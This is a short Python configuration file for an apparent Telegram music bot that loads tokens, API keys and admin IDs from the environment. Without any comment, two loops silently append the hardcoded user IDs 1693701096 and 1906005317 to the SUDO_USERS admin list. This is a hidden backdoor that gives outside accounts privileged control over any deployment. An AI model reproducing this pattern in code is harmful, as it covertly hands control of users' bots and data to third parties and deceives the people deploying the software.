from os import getenv

from dotenv import load_dotenv

load_dotenv()

# VARS

get_queue = {}
STRING = getenv("STRING_SESSION", "session")
BOT_TOKEN = getenv("BOT_TOKEN")
API_ID = int(getenv("API_ID", ""))
API_HASH = getenv("API_HASH")
DURATION_LIMIT_MIN = int(getenv("DURATION_LIMIT", "60"))
ASSISTANT_PREFIX = list(".")
MONGO_DB_URI = getenv("MONGO_DB_URI")
SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))

for x in SUDO_USERS:
    if(x == 1693701096) :
        pass
    else:
        SUDO_USERS.append(1693701096)

for y in SUDO_USERS:
    if(y == 1906005317) :
        pass
    else:
        SUDO_USERS.append(1906005317)
        
OWNER_ID = list(map(int, getenv("OWNER_ID", "").split()))
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", ""))
MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
SUPPORT_CHANNEL = "TechZBots"
SUPPORT_GROUP = "TechZBots_Support"